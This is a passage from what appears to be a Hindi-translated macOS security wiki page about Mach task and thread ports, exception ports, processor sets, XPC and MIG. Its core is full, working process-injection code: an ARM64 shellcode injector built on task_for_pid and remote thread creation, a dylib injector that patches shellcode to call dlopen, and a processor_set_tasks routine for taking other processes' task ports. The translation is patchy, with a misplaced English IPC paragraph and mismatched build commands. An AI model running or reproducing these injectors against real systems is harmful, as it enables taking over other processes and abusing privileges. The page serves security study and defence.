टास्क के भीतर क्रियाएँ करने के लिए, टास्क को अपने आप के लिए `SEND` राइट की आवश्यकता थी जो `mach_task_self()` को कॉल करके प्राप्त की गई थी (जो `task_self_trap` (28) का उपयोग करता है)। इस अनुमति के साथ एक टास्क कई क्रियाएँ कर सकता है जैसे:

* `task_threads`: टास्क के सभी धागों के लिए SEND राइट प्राप्त करें
* `task_info`: टास्क के बारे में जानकारी प्राप्त करें
* `task_suspend/resume`: एक टास्क को रोकें या फिर फिर से शुरू करें
* `task_[get/set]_special_port`
* `thread_create`: एक धागा बनाएं
* `task_[get/set]_state`: टास्क स्थिति नियंत्रण करें
* और अधिक [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) में मिल सकता है।

{% hint style="danger" %}
ध्यान दें कि एक **अलग टास्क** के टास्क पोर्ट पर एक SEND राइट के साथ, एक अलग टास्क पर ऐसी क्रियाएँ करना संभव है।
{% endhint %}

इसके अतिरिक्त, टास्क\_पोर्ट भी **`vm_map`** पोर्ट है जिससे एक टास्क के भीतर मेमोरी पढ़ने और संशोधित करने की अनुमति होती है जैसे `vm_read()` और `vm_write()` के फ़ंक्शन के साथ। यह मूल रूप से इसका मतलब है कि एक टास्क जिसके पास एक अलग टास्क के टास्क\_पोर्ट पर SEND राइट है, उस टास्क में कोड इंजेक्ट करने में सक्षम होगा।

ध्यान रखें कि क्योंकि **कर्नेल भी एक टास्क है**, अगर कोई **SEND अनुमतियाँ** प्राप्त कर लेता है **`kernel_task`** पर, तो वह कर्नेल को कुछ भी निष्पादित करने की क्षमता होगी (जेलब्रेक्स).

* `mach_task_self()` को कॉल करने के लिए **नाम प्राप्त करने** के लिए इस पोर्ट के लिए कॉल करें कॉलर टास्क के लिए। यह पोर्ट केवल **`exec()`** के अवरोध के बाहर **विरासत** है; `fork()` के साथ नई टास्क बनाई जाती है (एक विशेष मामले के रूप में, एक टास्क को `exec()` के बाद भी एक नया टास्क पोर्ट मिलता है।) टास्क उत्पन्न करने और इसका पोर्ट प्राप्त करने का एकमात्र तरीका है ["पोर्ट स्वैप नृत्य"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) करते समय `fork()` करते समय।
* इस पोर्ट तक पहुंचने की प्रतिबंधाएँ (बाइनरी `AppleMobileFileIntegrity` से `macos_task_policy` से):
* यदि ऐप के पास **`com.apple.security.get-task-allow` entitlement** है तो **एक ही उपयोगकर्ता से समान प्रक्रियाएँ टास्क पोर्ट तक पहुंच सकती हैं** (डीबगिंग के लिए Xcode द्वारा सामान्यत: जोड़ा जाता है)। **नोटराइज़ेशन** प्रक्रिया इसे उत्पादन रिलीज़ के लिए नहीं अनुमति देगी।
* **`com.apple.system-task-ports`** entitlement वाले ऐप्स किसी भी **प्रक्रिया के लिए टास्क पोर्ट प्राप्त कर सकते हैं**, केवल कर्नेल को नहीं। पुराने संस्करणों में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple एप्लिकेशन्स को प्रदान किया जाता है।
* **रूट ऐप्स** एक **हार्डन्ड** रनटाइम के साथ कंपाइल नहीं की गई प्रक्रियाओं के **टास्क पोर्ट तक पहुंच सकते हैं** (और न केवल Apple से).

**टास्क नाम पोर्ट:** एक _टास्क पोर्ट_ का एक अनधिकृत संस्करण। यह टास्क को संदर्भित करता है, लेकिन इसे नियंत्रित करने की अनुमति नहीं देता। इसके माध्यम से उपलब्ध एकमात्र चीज है `task_info()`।

### Thread Ports

धागों के साथ भी संबंधित पोर्ट होते हैं, जो टास्क को कॉल करने से दिखाई देते हैं **`task_threads`** और प्रोसेसर के साथ `processor_set_threads`। धागे पोर्ट के लिए एक SEND राइट थ्रेड एक्ट उपप्रणाली से फ़ंक्शन का उपयोग करने की अनुमति देता है, जैसे:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

किसी भी धागे को इस पोर्ट को प्राप्त करने के लिए **`mach_thread_sef`** कॉल कर सकता है।

### धागे के माध्यम से शेलकोड इंजेक्शन टास्क पोर्ट के माध्यम से

आप यहां से एक शेलकोड प्राप्त कर सकते हैं:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% टैब शीर्षक="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**कंपाइल** करें पिछले प्रोग्राम को और **अधिकार** जोड़ें कोड इंजेक्शन करने के लिए उसी उपयोगकर्ता के साथ (अगर नहीं तो आपको **sudo** का उपयोग करना होगा)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
इसे iOS पर काम कराने के लिए आपको `dynamic-codesigning` अधिकार चाहिए होते हैं ताकि आप एक लिखने योग्य मेमोरी को क्रियाशील बना सकें।
{% endhint %}

### टास्क पोर्ट के माध्यम से थ्रेड में Dylib इंजेक्शन

macOS में **थ्रेड** को **Mach** का उपयोग करके या **posix `pthread` एपीआई** का उपयोग करके मानित किया जा सकता है। हमने पिछले इंजेक्शन में जिस थ्रेड को उत्पन्न किया था, वह Mach एपीआई का उपयोग करके उत्पन्न किया गया था, इसलिए **यह posix अनुरूप नहीं है**।

एक सरल शैली को **इंजेक्ट करना संभव था** ताकि एक कमांड को निष्पादित करने के लिए क्योंकि इसे **posix के साथ काम करने की आवश्यकता नहीं थी**, केवल Mach के साथ। **अधिक जटिल इंजेक्शन** को भी **थ्रेड** को अधिक **posix अनुरूप** होना चाहिए।

इसलिए, **थ्रेड** को **सुधारने** के लिए यह कॉल करना चाहिए **`pthread_create_from_mach_thread`** जो एक मान्य pthread बनाएगा। फिर, इस नए pthread को **dlopen** को कॉल करने के लिए कर सकता है **सिस्टम से एक dylib लोड करने के लिए**, इसलिए नए शैली को लिखने की बजाय विभिन्न क्रियाएँ करने के लिए अपनी लाइब्रेरीज़ लोड करना संभव है।

आप यहां **उदाहरण dylibs** पा सकते हैं (उदाहरण के लिए जो एक लॉग उत्पन्न करता है और फिर आप इसे सुन सकते हैं):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"दूरस्थ धागे के कोड के लिए मेमोरी अनुमतियों को सेट करने में असमर्थ: त्रुटि %s\n", mach_error_string(kr));
return (-4);
}

// आवंटित स्टैक मेमोरी पर अनुमतियाँ सेट करें
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"दूरस्थ धागे के स्टैक के लिए मेमोरी अनुमतियों को सेट करने में असमर्थ: त्रुटि %s\n", mach_error_string(kr));
return (-4);
}


// शेलकोड चलाने के लिए धागा बनाएं
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // यह वास्तविक स्टैक है
//remoteStack64 -= 8;  // 16 की संरेखण की आवश्यकता है

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("दूरस्थ स्टैक 64  0x%llx, दूरस्थ कोड है %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"दूरस्थ धागा बनाने में असमर्थ: त्रुटि %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "उपयोग: %s _pid_ _क्रिया_\n", argv[0]);
fprintf (stderr, "   _क्रिया_: डिस्क पर एक डायलिब का पथ\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib नहीं मिली\n");
}

}
```
</details>  

### macOS IPC (Inter-Process Communication)

#### macOS IPC Overview

Inter-process communication (IPC) is a mechanism that allows processes to communicate and share data with each other. In macOS, IPC can be achieved using various techniques such as Mach ports, XPC services, and Apple events. These communication channels can be abused by attackers to escalate privileges or perform other malicious activities. It is important to understand how IPC works on macOS and how to secure it against abuse.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### थ्रेड हाइजैकिंग के माध्यम से टास्क पोर्ट के माध्यम से <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में प्रक्रिया का एक थ्रेड हाइजैक किया जाता है:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### टास्क पोर्ट इंजेक्शन डिटेक्शन

`task_for_pid` या `thread_create_*` को कॉल करने पर कर्नल से टास्क संरचना में एक काउंटर बढ़ाता है जिसे उपयोगकर्ता मोड से एक्सेस किया जा सकता है जब task\_info(task, TASK\_EXTMOD\_INFO, ...) को कॉल किया जाता है।

## अपवाद पोर्ट

जब किसी थ्रेड में एक अपवाद होता है, तो यह अपवाद थ्रेड के निर्धारित अपवाद पोर्ट पर भेजा जाता है। अगर थ्रेड इसे संभालने में सक्षम नहीं है, तो यह टास्क अपवाद पोर्ट पर भेजा जाता है। अगर टास्क इसे संभालने में सक्षम नहीं है, तो यह होस्ट पोर्ट पर भेजा जाता है जिसे लॉन्चडी द्वारा प्रबंधित किया जाता है (जहां इसे स्वीकृत किया जाएगा)। इसे अपवाद ट्रायज कहा जाता है।

ध्यान दें कि अंत में सामान्यत: यदि सही ढंग से संभाला नहीं जाता है, तो रिपोर्ट को रिपोर्टक्रैश डेमन्ड द्वारा संभाला जाएगा। हालांकि, एक ही टास्क में एक अपवाद को संभालने के लिए एक अन्य थ्रेड संभाल सकता है, यही कारण है कि `PLCrashReporter` जैसे क्रैश रिपोर्टिंग उपकरण करते हैं।

## अन्य ऑब्जेक्ट

### घड़ी

किसी भी उपयोगकर्ता को घड़ी के बारे में जानकारी तक पहुंचने की अनुमति है, हालांकि समय सेट करने या अन्य सेटिंग्स को संशोधित करने के लिए किसी को रूट होना चाहिए।

जानकारी प्राप्त करने के लिए `clock` उपप्रणाली से फ़ंक्शन कॉल करना संभव है जैसे: `clock_get_time`, `clock_get_attributtes` या `clock_alarm`\
मान्यता सेट करने के लिए `clock_priv` उपप्रणाली का उपयोग किया जा सकता है जैसे `clock_set_time` और `clock_set_attributes`

### प्रोसेसर और प्रोसेसर सेट

प्रोसेसर एपीआई एक एकल तार्किक प्रोसेसर को नियंत्रित करने की अनुमति देती है जैसे `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

इसके अतिरिक्त, **प्रोसेसर सेट** एपीआई एक समूह में कई प्रोसेसरों को समूहित करने का एक तरीका प्रदान करती है। डिफ़ॉल्ट प्रोसेसर सेट प्राप्त करने के लिए **`processor_set_default`** को कॉल करना संभव है।\
ये कुछ दिलचस्प एपीआई हैं प्रोसेसर सेट के साथ बातचीत करने के लिए:

* `processor_set_statistics`
* `processor_set_tasks`: प्रोसेसर सेट के अंदर सभी कार्यों के लिए एक एरे भेजता है
* `processor_set_threads`: प्रोसेसर सेट के अंदर सभी थ्रेड्स के लिए एक एरे भेजता है
* `processor_set_stack_usage`
* `processor_set_info`

[**इस पोस्ट**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/) में उल्लिखित के अनुसार, इससे पहले यह पहले उल्लिखित सुरक्षा को अनदेखा करने की अनुमति देता था कि अन्य प्रक्रियाओं में कार्य पोर्ट प्राप्त करने के लिए **`processor_set_tasks`** को कॉल करके उन्हें नियंत्रित करें।\
आजकल आपको उस फ़ंक्शन का उपयोग करने के लिए रूट की आवश्यकता है और यह सुरक्षित है ताकि आप केवल असुरक्षित प्रक्रियाओं पर इन पोर्ट्स को प्राप्त कर सकें।

आप इसे इस प्रकार से प्रयास कर सकते हैं:

<details>

<summary><strong>processor_set_tasks कोड</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
